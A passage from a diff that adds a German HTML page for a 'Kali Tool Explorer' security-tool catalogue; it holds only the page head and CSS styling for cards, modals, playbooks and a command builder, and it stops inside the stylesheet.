@@ -1,0 +1,4157 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Kali Tool Explorer — Blue &amp; Purple</title>
+  <meta name="description" content="Interaktiver Kali Linux Tool Explorer — 144 Tools in Blue (Offensive) und Purple (Defensive). Suche, vergleiche, favorisiere, Playbooks.">
+  <meta name="theme-color" content="#050507">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='6' fill='%2322d3ee'/></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;600&family=Sora:wght@700&display=swap" rel="stylesheet">
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg-void:#050507;--bg-base:#0a0a10;--bg-surface:#12121a;--bg-elevated:#1a1a24;--bg-glass:rgba(26,26,36,.7);
+      --tape-1:#fbbf24;--tape-2:#34d399;--tape-3:#22d3ee;--tape-4:#a78bfa;--tape-5:#f87171;--tape-6:#60a5fa;--tape-7:#14b8a6;
+      --accent-cyan:#22d3ee;--accent-green:#34d399;--accent-amber:#fbbf24;--accent-red:#f87171;
+      --text-primary:#e4e4e7;--text-secondary:#a1a1aa;--text-muted:#71717a;--text-dim:#6b6b75;
+      --border:rgba(255,255,255,.06);--border-strong:rgba(255,255,255,.14);
+      --font-body:'Inter',system-ui,sans-serif;--font-display:'Sora',system-ui,sans-serif;--font-mono:'JetBrains Mono',monospace;
+    }
+    :focus-visible{outline:2px solid var(--accent-cyan);outline-offset:3px;border-radius:4px}
+    :focus:not(:focus-visible){outline:none}
+    /* Globaler Mini-Fade — alles fadet smooth, keine Layout-Props (vermeidet Jank) */
+    *,*::before,*::after{transition:background-color .2s ease,border-color .2s ease,color .15s ease,box-shadow .2s ease,opacity .2s ease,fill .2s ease}
+    html{scroll-behavior:smooth;scroll-padding-top:100px}
+    body{font-family:var(--font-body);background:var(--bg-void);color:var(--text-primary);line-height:1.6;-webkit-font-smoothing:antialiased;overflow-x:hidden;min-height:100vh}
+    .skip-link{position:absolute;left:-9999px;top:1rem;z-index:100;padding:8px 16px;background:var(--bg-elevated);border:1px solid var(--accent-cyan);border-radius:6px;color:var(--accent-cyan);text-decoration:none}
+    .skip-link:focus{left:1rem}
+    .app-header{position:relative;z-index:2;padding:48px 24px 24px;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(10,10,16,.95),transparent)}
+    .header-inner{max-width:1280px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;gap:24px;flex-wrap:wrap}
+    .terminal-prefix{font-family:var(--font-mono);font-size:.75rem;color:var(--accent-green);letter-spacing:.1em;margin-bottom:8px}
+    h1{font-family:var(--font-display);font-size:clamp(1.6rem,4vw,2.4rem);font-weight:700;letter-spacing:-.02em;margin-bottom:8px}
+    h1 .accent{color:var(--accent-cyan)}
+    .subtitle{color:var(--text-secondary);font-size:.95rem}
+    .header-stats{font-family:var(--font-mono);font-size:.8rem;color:var(--text-muted);text-align:right}
+    .filter-bar{position:sticky;top:0;z-index:50;max-width:1280px;margin:0 auto;padding:12px 24px;background:rgba(5,5,7,.92);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);display:flex;gap:12px;align-items:center;flex-wrap:wrap}
+    .filter-search{flex:1;min-width:200px;padding:10px 16px;background:var(--bg-surface);border:1px solid var(--border);border-radius:8px;color:var(--text-primary);font-size:.9rem;font-family:var(--font-body);outline:none;transition:border-color .2s}
+    .filter-search:focus{border-color:var(--accent-cyan)}
+    .filter-search::placeholder{color:var(--text-muted)}
+    .filter-chips{display:flex;gap:6px;flex-wrap:wrap}
+    .filter-btn{padding:6px 14px;background:var(--bg-surface);border:1px solid var(--border);border-radius:100px;font-family:var(--font-mono);font-size:.72rem;font-weight:500;color:var(--text-secondary);cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:6px}
+    .filter-btn:hover{border-color:var(--border-strong);color:var(--text-primary)}
+    .filter-btn.active{background:var(--bg-elevated);border-color:var(--accent-cyan);color:var(--accent-cyan)}
+    .filter-btn .filter-count{font-size:.65rem;opacity:.7}
+    .container{max-width:1280px;margin:0 auto;padding:32px 24px 80px}
+    .tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
+    .no-results{text-align:center;padding:60px 24px;color:var(--text-muted)}
+    .no-results p{font-size:1.1rem}
+    .app-footer{text-align:center;padding:32px 24px;border-top:1px solid var(--border);font-size:.8rem;color:var(--text-muted);font-family:var(--font-mono)}
+
+/* ═══ TOOL CARDS ═══ */
+    .tool-card{background:var(--bg-surface);border:1px solid var(--border);border-radius:12px;padding:0;overflow:hidden;position:relative;transition:transform .2s,box-shadow .2s,border-color .2s;display:flex;flex-direction:column}
+    .tool-card:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(0,0,0,.4);border-color:var(--border-strong)}
+    .tool-card{border-top:3px solid var(--accent-cyan)}
+    [data-mode="purple"] .tool-card{border-top:3px solid #a855f7}
+    .tool-card-head{display:flex;justify-content:space-between;align-items:flex-start;padding:16px 16px 0;gap:8px}
+    .tool-name{font-family:var(--font-mono);font-size:1.05rem;font-weight:600;color:var(--text-primary);letter-spacing:-.01em}
+    .tool-name::before{content:'> ';color:var(--accent-cyan);opacity:.7}
+    .tool-num{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);background:var(--bg-elevated);padding:2px 8px;border-radius:100px}
+    .tool-pop{position:absolute;top:12px;right:12px;font-family:var(--font-mono);font-size:.6rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;padding:3px 8px;border-radius:100px;z-index:2}
+    .tool-pop.daily{background:rgba(34,211,238,.12);color:var(--accent-cyan);border:1px solid rgba(34,211,238,.3)}
+    .tool-pop.classic{background:rgba(251,191,36,.12);color:var(--accent-amber);border:1px solid rgba(251,191,36,.3)}
+    .tool-pop.gold{background:rgba(251,191,36,.18);color:#fde047;border:1px solid rgba(251,191,36,.5)}
+    .tool-pop.special{background:rgba(167,139,250,.12);color:var(--tape-4);border:1px solid rgba(167,139,250,.3)}
+    .tool-pop.standard{background:var(--bg-elevated);color:var(--text-muted);border:1px solid var(--border)}
+    .tool-cmd{margin:12px 16px;padding:10px 12px;background:var(--bg-void);border:1px solid var(--border);border-radius:6px;font-family:var(--font-mono);font-size:.82rem;color:var(--accent-green);overflow-x:auto;white-space:nowrap;position:relative;padding-right:40px}
+    .tool-cmd-copy{position:absolute;top:50%;right:6px;transform:translateY(-50%);background:var(--bg-elevated);border:1px solid var(--border);border-radius:4px;padding:3px 8px;font-size:.65rem;color:var(--text-muted);cursor:pointer;opacity:0;transition:opacity .2s}
+    .tool-card:hover .tool-cmd-copy{opacity:1}
+    .tool-cmd-copy:hover{color:var(--accent-cyan);border-color:var(--accent-cyan)}
+    .tool-desc{padding:0 16px 12px;color:var(--text-secondary);font-size:.88rem;line-height:1.5;flex-grow:1}
+    .tool-tags{display:flex;flex-wrap:wrap;gap:6px;padding:0 16px 16px}
+    .tool-tag{font-family:var(--font-mono);font-size:.62rem;padding:3px 8px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:100px;color:var(--text-muted)}
+    .tool-audio{display:flex;justify-content:space-between;align-items:center;padding:8px 16px;border-top:1px solid var(--border);background:rgba(0,0,0,.2)}
+    .tool-audio-btn{background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:.75rem;display:flex;align-items:center;gap:4px;padding:4px 8px;border-radius:4px;transition:color .2s,background .2s}
+    .tool-audio-btn:hover{color:var(--accent-cyan);background:rgba(34,211,238,.1)}
+    .tool-audio-time{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim)}
+    .fav-btn{position:absolute;top:12px;left:12px;background:none;border:none;font-size:1rem;cursor:pointer;color:var(--text-dim);opacity:0;transition:opacity .2s,color .2s;z-index:3;padding:4px;line-height:1}
+    .tool-card:hover .fav-btn{opacity:.6}
+    .fav-btn:hover{opacity:1!important;color:var(--accent-amber)}
+    .fav-btn.active{opacity:1!important;color:var(--accent-amber)}
+    .filter-btn.fav-filter{border-color:rgba(251,191,36,.3)}
+    .filter-btn.fav-filter.active{background:rgba(251,191,36,.12);border-color:var(--accent-amber);color:var(--accent-amber)}
+
+/* ═══ COMPARATOR ═══ */
+.compare-btn{position:absolute;bottom:8px;right:12px;background:none;border:1px solid var(--border);border-radius:4px;padding:2px 8px;font-size:.6rem;color:var(--text-dim);cursor:pointer;opacity:0;transition:opacity .2s,color .2s,border-color .2s;z-index:3}
+.tool-card:hover .compare-btn{opacity:.7}
+.compare-btn:hover{opacity:1!important;color:var(--accent-cyan);border-color:var(--accent-cyan)}
+.compare-btn.active{opacity:1!important;color:var(--accent-cyan);border-color:var(--accent-cyan);background:rgba(34,211,238,.1)}
+.compare-bar{position:fixed;bottom:0;left:0;right:0;z-index:100;background:rgba(5,5,7,.95);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px);border-top:1px solid var(--accent-cyan);padding:12px 24px;display:none;align-items:center;gap:12px;flex-wrap:wrap}
+.compare-bar.visible{display:flex}
+.compare-bar-label{font-family:var(--font-mono);font-size:.75rem;color:var(--text-muted);white-space:nowrap}
+.compare-item{display:flex;align-items:center;gap:6px;padding:6px 12px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:6px;font-family:var(--font-mono);font-size:.75rem;color:var(--text-primary)}
+.compare-item-remove{background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:.9rem;padding:0 2px;line-height:1}
+.compare-item-remove:hover{color:var(--accent-red)}
+.compare-action{margin-left:auto;display:flex;gap:8px}
+.compare-btn-go{padding:8px 20px;background:var(--accent-cyan);color:var(--bg-void);border:none;border-radius:6px;font-weight:600;font-size:.85rem;cursor:pointer;font-family:var(--font-body)}
+.compare-btn-go:hover{background:#06b6d4}
+.compare-btn-clear{padding:8px 16px;background:transparent;color:var(--text-muted);border:1px solid var(--border);border-radius:6px;font-size:.85rem;cursor:pointer}
+.compare-btn-clear:hover{color:var(--text-primary);border-color:var(--border-strong)}
+.compare-modal-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:24px}
+.compare-modal-overlay.visible{display:flex}
+.compare-modal{background:var(--bg-surface);border:1px solid var(--border-strong);border-radius:12px;max-width:1100px;width:100%;max-height:85vh;overflow-y:auto;padding:32px;position:relative}
+.compare-modal-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text-muted);font-size:1.5rem;cursor:pointer;padding:4px 8px;line-height:1}
+.compare-modal-close:hover{color:var(--text-primary)}
+.compare-modal h2{font-family:var(--font-display);font-size:1.3rem;margin-bottom:20px;color:var(--text-primary)}
+.compare-table{width:100%;border-collapse:collapse}
+.compare-table th{background:var(--bg-elevated);padding:12px 16px;text-align:left;font-family:var(--font-mono);font-size:.75rem;color:var(--text-muted);border-bottom:1px solid var(--border);font-weight:500}
+.compare-table th:first-child{width:120px}
+.compare-table td{padding:12px 16px;font-size:.85rem;color:var(--text-secondary);border-bottom:1px solid var(--border);vertical-align:top}
+.compare-table td:first-child{font-family:var(--font-mono);font-size:.7rem;color:var(--text-muted);font-weight:500}
+.compare-cmd{font-family:var(--font-mono);font-size:.8rem;color:var(--accent-green);background:var(--bg-void);padding:6px 8px;border-radius:4px;display:inline-block;max-width:300px;overflow-x:auto;white-space:nowrap}
+/* ═══ QUICK-START PLAYBOOKS ═══ */
+.playbooks-section{margin-bottom:32px}
+.playbooks-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;gap:12px;flex-wrap:wrap}
+.playbooks-header h2{font-family:var(--font-display);font-size:1.1rem;color:var(--text-primary)}
+.playbooks-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px}
+.playbook-card{background:var(--bg-surface);border:1px solid var(--border);border-radius:10px;padding:14px;cursor:pointer;position:relative;overflow:hidden}
+.playbook-card:hover{border-color:var(--accent-cyan);background:var(--bg-elevated)}
+.playbook-card.active{border-color:var(--accent-cyan);box-shadow:0 0 0 1px var(--accent-cyan),0 4px 20px rgba(34,211,238,.12)}
+[data-mode="purple"] .playbook-card:hover{border-color:#a855f7}
+[data-mode="purple"] .playbook-card.active{border-color:#a855f7;box-shadow:0 0 0 1px #a855f7,0 4px 20px rgba(168,85,247,.12)}
+.playbook-icon{font-size:1.4rem;margin-bottom:6px}
+.playbook-name{font-family:var(--font-mono);font-size:.85rem;font-weight:600;color:var(--text-primary);margin-bottom:4px}
+.playbook-meta{display:flex;gap:8px;align-items:center;font-size:.65rem;color:var(--text-muted);font-family:var(--font-mono)}
+.playbook-difficulty{padding:1px 6px;border-radius:100px;font-weight:600}
+.playbook-difficulty.easy{background:rgba(52,211,153,.12);color:var(--accent-green)}
+.playbook-difficulty.medium{background:rgba(251,191,36,.12);color:var(--accent-amber)}
+.playbook-difficulty.hard{background:rgba(248,113,113,.12);color:var(--accent-red)}
+.tool-card.pb-match{box-shadow:0 0 0 2px var(--accent-cyan),0 8px 24px rgba(34,211,238,.15);border-color:var(--accent-cyan)}
+[data-mode="purple"] .tool-card.pb-match{box-shadow:0 0 0 2px #a855f7,0 8px 24px rgba(168,85,247,.15);border-color:#a855f7}
+/* ═══ LEARNING PATHS ═══ */
+.paths-section{margin-bottom:32px}
+.paths-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;gap:12px;flex-wrap:wrap}
+.paths-header h2{font-family:var(--font-display);font-size:1.1rem;color:var(--text-primary)}
+.paths-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
+.path-card{background:var(--bg-surface);border:1px solid var(--border);border-left:3px solid var(--accent-cyan);border-radius:12px;padding:18px;cursor:pointer;position:relative;overflow:hidden}
+.path-card:hover{border-color:var(--accent-cyan)}
+[data-mode="purple"] .path-card:hover{border-color:#a855f7}
+[data-mode="purple"] .path-card{border-left-color:#a855f7}
+.path-card.active{border-color:var(--accent-cyan);box-shadow:0 0 0 1px var(--accent-cyan)}
+[data-mode="purple"] .path-card.active{border-color:#a855f7;box-shadow:0 0 0 1px #a855f7}
+.path-icon{font-size:1.6rem;margin-bottom:8px}
+.path-name{font-family:var(--font-display);font-size:1rem;color:var(--text-primary);margin-bottom:4px}
+.path-desc{font-size:.76rem;color:var(--text-muted);margin-bottom:12px;line-height:1.4}
+.path-progress-bar{height:6px;background:var(--bg-elevated);border-radius:100px;overflow:hidden;margin-bottom:6px;box-shadow:inset 0 1px 2px rgba(0,0,0,.4)}
+.path-progress-fill{height:100%;background:var(--accent-cyan);border-radius:100px;transition:width .4s ease;box-shadow:0 0 8px rgba(34,211,238,.4)}
+[data-mode="purple"] .path-progress-fill{background:#a855f7}
+.path-progress-text{font-family:var(--font-mono);font-size:.65rem;color:var(--text-muted)}
+.path-weeks{display:none;margin-top:16px;border-top:1px solid var(--border);padding-top:14px}
+.path-card.active .path-weeks{display:block}
+.path-week{margin-bottom:12px}
+.path-week-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
+.path-week-title{font-family:var(--font-mono);font-size:.76rem;font-weight:600;color:var(--text-primary)}
+.path-week-check{width:18px;height:18px;accent-color:var(--accent-cyan);cursor:pointer}
+[data-mode="purple"] .path-week-check{accent-color:#a855f7}
+.path-week-goal{font-size:.72rem;color:var(--text-secondary);margin-bottom:6px;line-height:1.4}
+.path-week-tools{display:flex;flex-wrap:wrap;gap:4px}
+.path-week-tool{font-family:var(--font-mono);font-size:.65rem;padding:2px 8px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:100px;color:var(--text-secondary);cursor:pointer;transition:color .2s,border-color .2s}
+.path-week-tool:hover{color:var(--accent-cyan);border-color:var(--accent-cyan)}
+[data-mode="purple"] .path-week-tool:hover{color:#c084fc;border-color:#a855f7}
+.path-week.done .path-week-title{text-decoration:line-through;color:var(--text-muted)}
+.path-reset{margin-top:10px;font-family:var(--font-mono);font-size:.68rem;color:var(--text-muted);background:none;border:none;cursor:pointer}
+.path-reset:hover{color:var(--accent-red)}
+/* Wizard */
+.wizard-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.8);display:none;align-items:center;justify-content:center;padding:24px}
+.wizard-overlay.visible{display:flex}
+.wizard-modal{background:var(--bg-surface);border:1px solid var(--border-strong);border-radius:16px;max-width:580px;width:100%;padding:36px;position:relative;max-height:85vh;overflow-y:auto}
+.wizard-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text-muted);font-size:1.5rem;cursor:pointer}
+.wizard-close:hover{color:var(--text-primary)}
+.wizard-step-indicator{font-family:var(--font-mono);font-size:.68rem;color:var(--accent-cyan);margin-bottom:8px;letter-spacing:.05em}
+[data-mode="purple"] .wizard-step-indicator{color:#c084fc}
+.wizard-question{font-family:var(--font-display);font-size:1.2rem;color:var(--text-primary);margin-bottom:24px;line-height:1.3}
+.wizard-options{display:flex;flex-direction:column;gap:10px}
+.wizard-option{padding:16px 20px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:10px;cursor:pointer;text-align:left;color:var(--text-secondary);font-size:.92rem;font-family:var(--font-body);display:flex;align-items:center;gap:12px}
+.wizard-option:hover{border-color:var(--accent-cyan);background:rgba(34,211,238,.05);color:var(--text-primary);transform:translateX(4px)}
+[data-mode="purple"] .wizard-option:hover{border-color:#a855f7;background:rgba(168,85,247,.05)}
+.wizard-option-icon{font-size:1.3rem;flex-shrink:0}
+.wizard-result{padding:24px;background:var(--bg-elevated);border:1px solid var(--accent-cyan);border-radius:12px}
+[data-mode="purple"] .wizard-result{border-color:#a855f7}
+.wizard-result h3{font-family:var(--font-display);color:var(--accent-cyan);margin-bottom:8px;font-size:1.15rem}
+[data-mode="purple"] .wizard-result h3{color:#c084fc}
+.wizard-result-desc{color:var(--text-secondary);font-size:.88rem;margin-bottom:16px;line-height:1.5}
+.wizard-result-tools{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
+.wizard-result-tool{font-family:var(--font-mono);font-size:.7rem;padding:4px 10px;background:var(--bg-void);border:1px solid var(--border);border-radius:100px;color:var(--accent-green)}
+.wizard-actions{display:flex;gap:8px;flex-wrap:wrap}
+.wizard-btn-primary{padding:10px 20px;background:var(--accent-cyan);color:var(--bg-void);border:none;border-radius:8px;font-weight:600;font-size:.85rem;cursor:pointer;font-family:var(--font-body)}
+[data-mode="purple"] .wizard-btn-primary{background:#a855f7;color:#fff}
+.wizard-btn-primary:hover{filter:brightness(1.1)}
+.wizard-btn-secondary{padding:10px 16px;background:transparent;color:var(--text-muted);border:1px solid var(--border);border-radius:8px;font-size:.85rem;cursor:pointer;font-family:var(--font-body)}
+.wizard-btn-secondary:hover{color:var(--text-primary);border-color:var(--border-strong)}
+.wizard-back{margin-top:12px;font-size:.8rem;color:var(--text-muted);background:none;border:none;cursor:pointer;font-family:var(--font-mono)}
+.wizard-back:hover{color:var(--text-primary)}
+    @media(max-width:640px){.tools-grid{grid-template-columns:1fr}.header-inner{flex-direction:column;align-items:flex-start}}
+
+/* ═══ KEYBOARD SHORTCUTS HINT ═══ */
+.kbd-hint{position:fixed;bottom:16px;right:16px;z-index:90;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:10px 16px;font-size:.75rem;color:var(--text-muted);font-family:var(--font-mono);cursor:pointer;display:flex;align-items:center;gap:8px;transition:border-color .2s}
+.kbd-hint:hover{border-color:var(--accent-cyan)}
+.kbd-hint kbd{display:inline-block;padding:2px 6px;background:var(--bg-void);border:1px solid var(--border-strong);border-radius:3px;font-size:.7rem;color:var(--accent-cyan)}
+
+/* ═══ READING PROGRESS BAR ═══ */
+.reading-progress{position:fixed;top:0;left:0;height:2px;background:var(--accent-cyan);z-index:300;transition:width .1s;width:0%}
+
+/* ═══ CHEAT SHEET MODAL ═══ */
+.cheat-overlay{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;padding:24px}
+.cheat-overlay.visible{display:flex}
+.cheat-modal{background:var(--bg-surface);border:1px solid var(--border-strong);border-radius:12px;max-width:480px;width:100%;padding:32px;position:relative}
+.cheat-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text-muted);font-size:1.5rem;cursor:pointer}
+.cheat-close:hover{color:var(--text-primary)}
+.cheat-modal h2{font-family:var(--font-display);font-size:1.2rem;margin-bottom:16px;color:var(--text-primary)}
+.cheat-list{list-style:none;padding:0;margin:0}
+.cheat-list li{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)}
+.cheat-list li:last-child{border-bottom:none}
+.cheat-list kbd{display:inline-block;padding:3px 8px;background:var(--bg-void);border:1px solid var(--border-strong);border-radius:4px;font-size:.75rem;color:var(--accent-cyan);font-family:var(--font-mono)}
+.cheat-list span{color:var(--text-secondary);font-size:.85rem}
+
+/* ═══ TOOL DETAIL MODAL ═══ */
+.detail-overlay{position:fixed;inset:0;z-index:300;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;padding:20px;-webkit-backdrop-filter:blur(4px);backdrop-filter:blur(4px)}
+.detail-overlay.visible{display:flex}
+
+/* ═══ LLM PROMPT BUILDER ═══ */
+.prompt-overlay{position:fixed;inset:0;z-index:350;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
+.prompt-overlay.visible{display:flex}
+.prompt-modal{background:var(--bg-surface);border:1px solid var(--border-strong);border-radius:16px;max-width:720px;width:100%;max-height:88vh;overflow-y:auto;position:relative}
+.prompt-header{padding:20px 24px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.prompt-title{font-family:var(--font-display);font-size:1.2rem;color:var(--text-primary)}
+.prompt-close{background:none;border:none;color:var(--text-muted);font-size:1.5rem;cursor:pointer}
+.prompt-close:hover{color:var(--text-primary)}
+.prompt-body{padding:20px 24px}
+.prompt-section{margin-bottom:20px}
+.prompt-label{display:block;font-family:var(--font-mono);font-size:.7rem;color:var(--accent-cyan);text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}
+[data-mode="purple"] .prompt-label{color:#c084fc}
+.prompt-templates{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px}
+.prompt-template{background:var(--bg-elevated);border:1px solid var(--border);border-radius:10px;padding:12px;cursor:pointer;text-align:left}
+.prompt-template:hover{border-color:var(--accent-cyan)}
+[data-mode="purple"] .prompt-template:hover{border-color:#a855f7}
+.prompt-template.active{border-color:var(--accent-cyan);box-shadow:0 0 0 1px var(--accent-cyan)}
+[data-mode="purple"] .prompt-template.active{border-color:#a855f7;box-shadow:0 0 0 1px #a855f7}
+.prompt-template-icon{font-size:1.2rem;margin-bottom:4px}
+.prompt-template-name{font-family:var(--font-mono);font-size:.78rem;font-weight:600;color:var(--text-primary)}
+.prompt-template-desc{font-size:.68rem;color:var(--text-muted);margin-top:2px}
+.prompt-tool-select{display:flex;flex-wrap:wrap;gap:6px;max-height:200px;overflow-y:auto;padding:8px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px}
+.prompt-tool-chip{font-family:var(--font-mono);font-size:.72rem;padding:4px 10px;background:var(--bg-void);border:1px solid var(--border);border-radius:100px;color:var(--text-secondary);cursor:pointer}
+.prompt-tool-chip:hover{border-color:var(--accent-cyan)}
+.prompt-tool-chip.selected{background:rgba(34,211,238,.12);border-color:var(--accent-cyan);color:var(--accent-cyan)}
+[data-mode="purple"] .prompt-tool-chip.selected{background:rgba(168,85,247,.12);border-color:#a855f7;color:#c084fc}
+.prompt-target{width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:10px 14px;color:var(--text-primary);font-family:var(--font-body);font-size:.85rem}
+.prompt-target:focus{border-color:var(--accent-cyan);outline:none}
+.prompt-output{background:var(--bg-void);border:1px solid var(--border);border-radius:10px;padding:16px;font-family:var(--font-mono);font-size:.78rem;color:var(--text-secondary);line-height:1.6;white-space:pre-wrap;word-break:break-word;max-height:300px;overflow-y:auto;position:relative}
+.prompt-actions{display:flex;gap:8px;flex-wrap:wrap}
+.prompt-btn{padding:10px 18px;border:none;border-radius:8px;font-family:var(--font-body);font-size:.82rem;font-weight:600;cursor:pointer}
+.prompt-btn-primary{background:var(--accent-cyan);color:var(--bg-void)}
+[data-mode="purple"] .prompt-btn-primary{background:#a855f7;color:#fff}
+.prompt-btn-primary:hover{filter:brightness(1.1)}
+.prompt-btn-secondary{background:transparent;color:var(--text-secondary);border:1px solid var(--border)}
+.prompt-btn-secondary:hover{border-color:var(--border-strong);color:var(--text-primary)}
+.detail-modal{background:var(--bg-surface);border:1px solid var(--border-strong);border-radius:16px;max-width:640px;width:100%;max-height:85vh;overflow-y:auto;position:relative}
+.detail-header{padding:24px 24px 16px;border-bottom:1px solid var(--border)}
+.detail-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--text-muted);font-size:1.5rem;cursor:pointer;z-index:1;padding:4px 8px;line-height:1}
+.detail-close:hover{color:var(--text-primary)}
+.detail-badge{display:inline-block;font-family:var(--font-mono);font-size:.65rem;padding:2px 8px;border-radius:100px;font-weight:600;margin-bottom:8px}
+.detail-badge.daily{background:rgba(52,211,153,.12);color:var(--accent-green)}
+.detail-badge.classic{background:rgba(251,191,36,.12);color:var(--accent-amber)}
+.detail-badge.gold{background:rgba(168,85,247,.12);color:#c084fc}
+.detail-badge.special{background:rgba(167,139,250,.12);color:#c084fc}
+.detail-badge.standard{background:rgba(100,116,139,.12);color:var(--text-muted)}
+.detail-name{font-family:var(--font-display);font-size:1.5rem;color:var(--text-primary);margin-bottom:4px}
+.detail-cat{font-size:.8rem;color:var(--text-muted);font-family:var(--font-mono)}
+.detail-body{padding:20px 24px}
+.detail-section{margin-bottom:20px}
+.detail-section:last-child{margin-bottom:0}
+.detail-section-title{font-family:var(--font-mono);font-size:.7rem;color:var(--accent-cyan);text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}
+[data-mode="purple"] .detail-section-title{color:#c084fc}
+.detail-desc{color:var(--text-secondary);font-size:.9rem;line-height:1.6}
+.detail-tags{display:flex;flex-wrap:wrap;gap:6px}
+.detail-tag{font-family:var(--font-mono);font-size:.7rem;padding:3px 10px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:100px;color:var(--text-secondary)}
+.detail-cmd-block{background:var(--bg-void);border:1px solid var(--border);border-radius:8px;padding:12px 16px;font-family:var(--font-mono);font-size:.82rem;color:var(--accent-green);position:relative;overflow-x:auto}
+.detail-cmd-copy{position:absolute;top:8px;right:8px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:6px;padding:4px 10px;font-size:.68rem;color:var(--text-muted);cursor:pointer;font-family:var(--font-mono)}
+.detail-cmd-copy:hover{color:var(--accent-cyan);border-color:var(--accent-cyan)}
+.detail-examples{display:flex;flex-direction:column;gap:8px}
+.detail-example{background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:10px 14px}
+.detail-example-cmd{font-family:var(--font-mono);font-size:.78rem;color:var(--accent-green);margin-bottom:4px;word-break:break-all}
+.detail-example-desc{font-size:.75rem;color:var(--text-muted)}
+.detail-links{display:flex;flex-wrap:wrap;gap:8px}
+.detail-link{font-family:var(--font-mono);font-size:.72rem;padding:6px 12px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;color:var(--accent-cyan);text-decoration:none;cursor:pointer;transition:border-color .2s,background .2s}
+[data-mode="purple"] .detail-link{color:#c084fc}
+.detail-link:hover{background:rgba(34,211,238,.08);border-color:var(--accent-cyan)}
+[data-mode="purple"] .detail-link:hover{background:rgba(168,85,247,.08);border-color:#a855f7}
+.detail-related{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px}
+.detail-related-card{background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:10px;cursor:pointer;transition:border-color .2s,background .2s}
+.detail-related-card:hover{border-color:var(--accent-cyan);background:rgba(34,211,238,.04)}
+[data-mode="purple"] .detail-related-card:hover{border-color:#a855f7;background:rgba(168,85,247,.04)}
+.detail-related-name{font-family:var(--font-mono);font-size:.78rem;color:var(--text-primary);margin-bottom:2px}
+.detail-related-cat{font-size:.65rem;color:var(--text-muted)}
+.tool-card{cursor:pointer}
+
+/* ═══ COMMAND BUILDER ═══ */
+.cmdbuilder{margin-top:16px;border-top:1px solid var(--border);padding-top:16px}
+.cmdbuilder-title{font-family:var(--font-mono);font-size:.7rem;color:var(--accent-cyan);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px}
+[data-mode="purple"] .cmdbuilder-title{color:#c084fc}
+.cmdbuilder-target{width:100%;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;padding:8px 12px;color:var(--text-primary);font-family:var(--font-mono);font-size:.78rem;margin-bottom:12px;box-sizing:border-box}
+.cmdbuilder-target:focus{border-color:var(--accent-cyan);outline:none}
+[data-mode="purple"] .cmdbuilder-target:focus{border-color:#a855f7}
+.cmdbuilder-flags{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:12px}
+.cmdbuilder-flag{display:flex;align-items:flex-start;gap:8px;padding:8px 10px;background:var(--bg-elevated);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:border-color .15s,background .15s}
+.cmdbuilder-flag:hover{border-color:var(--accent-cyan)}
+[data-mode="purple"] .cmdbuilder-flag:hover{border-color:#a855f7}
+.cmdbuilder-flag.active{border-color:var(--accent-cyan);background:rgba(34,211,238,.05)}
